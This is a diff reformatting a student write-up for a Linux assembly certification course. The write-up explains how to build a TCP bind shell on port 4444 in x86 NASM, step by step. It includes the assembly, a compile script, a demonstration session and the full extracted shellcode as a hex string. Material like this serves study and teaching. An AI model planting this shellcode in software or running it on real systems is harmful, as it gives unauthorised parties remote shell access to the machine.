@@ -1,8 +1,8 @@
-Assignment 1
+**Assignment 1**
 
 Shellcode for TCP Bind Shell witha cutom wrapper script for dynamic port choosing
 
-Introduction
+**Introduction**
 
 	Bind shell is a type of shell in which the target machine opens up a communication port or a listener on the victim machine and waits for an incoming connection. The attacker then connects to the victim machine’s listener which then leads to code or command execution on the server.
 
@@ -12,17 +12,17 @@ Introduction
 	https://resources.infosecinstitute.com/icmp-reverse-shell/#gref
 
 
-Methodology
+**Methodology**
 
 	Its noted that it would be easier to analyse a tcp_bind shell implemented using a high level program like c to see whats going on under the hood and replicate the functions/ sys calls using nasm.
 
 		Overall summary of whats happening under the hood 
-			Creates a socket
-			Binds the socket to an IP address and port
-			Listens for incoming connections
-			Accept an incoming connection
-			Redirects STDIN, STDOUT and STDERR to the socket once a connection is made
-			Executes a shell
+			-Creates a socket
+			-Binds the socket to an IP address and port
+			-Listens for incoming connections
+			-Accept an incoming connection
+			-Redirects STDIN, STDOUT and STDERR to the socket once a connection is made
+			-Executes a shell
 
 
 		NASM intro
@@ -90,7 +90,7 @@ Methodology
 
 		Binds the socket to an IP address and port
 				
-        After a socket is created "sock" socket descriptor is binded to all interfaces and a particular port ,here 4444
+        		After a socket is created "sock" socket descriptor is binded to all interfaces and a particular port ,here 4444
 
 				bind(sock, (struct sockaddr *) &addr, sizeof(addr));
 
@@ -204,10 +204,10 @@ Methodology
        				nothing is filled in; in this case, addrlen is not used, and should
        				also be NULL.
 
-       NASM
+       		NASM
 
-       	    xor esi,esi
-            push esi     ;addrelen 0   since peer info is not needed
+       	    		xor esi,esi
+            		push esi     ;addrelen 0   since peer info is not needed
         		push esi     ;sockaddr *addr 0
         		push edi     ;sock fd
         		mov ecx,esp
@@ -222,7 +222,7 @@ Methodology
         		ECX contains address location to sockfiledescriptor ,0 ,0			
 
 
-    Redirect STDIN, STDOUT and STDERR to the socket once a connection is made
+    	Redirect STDIN, STDOUT and STDERR to the socket once a connection is made
        			
        		Redirect/Duplicate stdin,stdout,stderr to the socket process	
 
@@ -240,18 +240,18 @@ Methodology
     		 mov ebx,eax   # file descrptor for accepted socket
         	 xor ecx,ecx   #0,stdin
 
-             mov al,0x3f   #63 dup2 sys call
-             int 0x80
+             	mov al,0x3f   #63 dup2 sys call
+             	int 0x80
 
-             inc ecx       #1,stdout
-             mov al,0x3f
-             int 0x80
+             	inc ecx       #1,stdout
+             	mov al,0x3f
+             	int 0x80
 
-             inc ecx       #2,stderr
-             mov al,0x3f
-             int 0x80
+             	inc ecx       #2,stderr
+             	mov al,0x3f
+             	int 0x80
 
-            EAX = 0x3f , ie 63 dup2
+            	EAX = 0x3f , ie 63 dup2
             	toor@ubuntu:~/Desktop/slae/Assignments/1$ cat /usr/include/i386-linux-gnu/asm/unistd_32.h | grep 63
 				      #define __NR_dup2                63
 				      @int dup2(int oldfd, int newfd);
@@ -262,7 +262,7 @@ Methodology
 			       ECX = 0,1 and 2 to represent stdin ,stdout and stderr
 
 
-    Executes a shell	
+    	Executes a shell	
 
     		This executes the program referred to by pathname. Here /bin/sh is executed.It could be /bin/sh or /bin/bash or /bin/rsh etc
     			
@@ -273,24 +273,24 @@ Methodology
     			since we are not passing any arguments and not need of any environemntal value ,they are set to null
 
 
-    	NASM
+    		NASM
 
-    	xor eax,eax
-        push eax
-        push 0x68736162         ////bin/bash in reverse
-        push 0x2f6e6962
-        push 0x2f2f2f2f
-        mov ebx,esp
+    		xor eax,eax
+        	push eax
+        	push 0x68736162         ////bin/bash in reverse
+        	push 0x2f6e6962
+        	push 0x2f2f2f2f
+        	mov ebx,esp
 
-        push eax    # environament value ie ,0
-        push ebx    #pointer to /bin/bash address loc
-        mov ecx,esp
+        	push eax    # environament value ie ,0
+        	push ebx    #pointer to /bin/bash address loc
+        	mov ecx,esp
 
-        mov al,11
-        xor edx,edx #arguments for execve , ie 0
-        int 0x80
+        	mov al,11
+        	xor edx,edx #arguments for execve , ie 0
+        	int 0x80
 
-        EAX = 11 , syscall execve
+        	EAX = 11 , syscall execve
         	toor@ubuntu:~/Desktop/slae/Assignments/1$ cat /usr/include/i386-linux-gnu/asm/unistd_32.h | grep 11
 			#define __NR_execve              11
 
@@ -300,10 +300,12 @@ Methodology
 
 
 
-Practical
+**Practical**
+
 A simple compile script is used to compile and link .asm file , once successfull ,we can execute it and connect to it
 
 toor@ubuntu:~/Desktop/slae/Assignments/1$ cat compile.sh
+
 #!/bin/bash
 
 echo 'Assembling with nasm'
@@ -313,6 +315,7 @@ echo 'Success, Now Linking'
 ld -o $1 $1.o
 
 echo 'Go Ahead, may the force be with you'
+
 toor@ubuntu:~/Desktop/slae/Assignments/1$ ./compile.sh bind
 Assembling with nasm
 Success, Now Linking
@@ -327,22 +330,28 @@ uid=1000(toor) gid=1000(toor) groups=1000(toor),4(adm),24(cdrom),27(sudo),30(dip
 echo $SHELL
 /bin/bash
 
-SHELLCODE
+**SHELLCODE**
+
 
 Using objdump to extract shellcode
-toor@ubuntu:~/Desktop/slae/Assignments/1$ objdump -d ./bind|grep '[0-9a-f]:'|grep -v 'file'|cut -f2 -d:|cut -f1-6 -d' '|tr -s ' '|tr '\t' ' '|sed 's/ $//g'|sed 's/ /\\x/g'|paste -d '' -s |sed 's/^/"/'|sed 's/$/"/g'
-"\x31\xc0\x31\xdb\x31\xc9\x31\xd2\x31\xf6\x31\xff\x50\x6a\x06\x6a\x01\x6a\x02\x89\xe1\xb0\x66\xb3\x01\xcd\x80\x89\xc7\x52\x52\x66\x68\x11\x5c\x66\x6a\x02\x89\xe6\x6a\x10\x56\x57\x89\xe1\xb0\x66\xb3\x02\xcd\x80\x31\xf6\x56\x57\x89\xe1\xb0\x66\xb3\x04\xcd\x80\x31\xf6\x56\x56\x57\x89\xe1\xb0\x66\xb3\x05\xcd\x80\x89\xc3\x31\xc9\xb0\x3f\xcd\x80\x41\xb0\x3f\xcd\x80\x41\xb0\x3f\xcd\x80\x31\xc0\x50\x68\x62\x61\x73\x68\x68\x62\x69\x6e\x2f\x68\x2f\x2f\x2f\x2f\x89\xe3\x50\x53\x89\xe1\xb0\x0b\x31\xd2\xcd\x80"
+
+toor@ubuntu:~/Desktop/slae/Assignments/1$ objdump -d ./bind|grep '[0-9a-f]:'|grep -v 'file'|cut -f2 -d:|cut -f1-6 -d' '|tr -s ' '|tr 
+'\t' ' '|sed 's/ $//g'|sed 's/ /\\x/g'|paste -d '' -s |sed 's/^/"/'|sed 's/$/"/g'
+"\x31\xc0\x31\xdb\x31\xc9\x31\xd2\x31\xf6\x31\xff\x50\x6a\x06\x6a\x01\x6a\x02\x89\xe1\xb0\x66\xb3\x01\xcd\x80\x89\xc7\x52\x52\x66\x68\x1
+1\x5c\x66\x6a\x02\x89\xe6\x6a\x10\x56\x57\x89\xe1\xb0\x66\xb3\x02\xcd\x80\x31\xf6\x56\x57\x89\xe1\xb0\x66\xb3\x04\xcd\x80\x31\xf6\x56\x5
+6\x57\x89\xe1\xb0\x66\xb3\x05\xcd\x80\x89\xc3\x31\xc9\xb0\x3f\xcd\x80\x41\xb0\x3f\xcd\x80\x41\xb0\x3f\xcd\x80\x31\xc0\x50\x68\x62\x61\x7
+3\x68\x68\x62\x69\x6e\x2f\x68\x2f\x2f\x2f\x2f\x89\xe3\x50\x53\x89\xe1\xb0\x0b\x31\xd2\xcd\x80"
 toor@ubuntu:~/Desktop/slae/Assignments/1$
 
 
-Wrapper script to bind custom port
+**Wrapper script to bind custom port**
 
 since port 4444 is harcoded in the script we have to create a custom shellcode with customisable portnumber.
-
 Script logic is user port number input is converted to network byte order and swapped with 4444 representation.
 
 
-Github Repo
+**Github Repo**
+
 This blog post has been created for completing the requirements of the SecurityTube Linux Assembly Expert certification: http://securitytube-training.com/online-courses/securitytube-linux-assembly-expert/
 
 Student ID: SLAE-1509
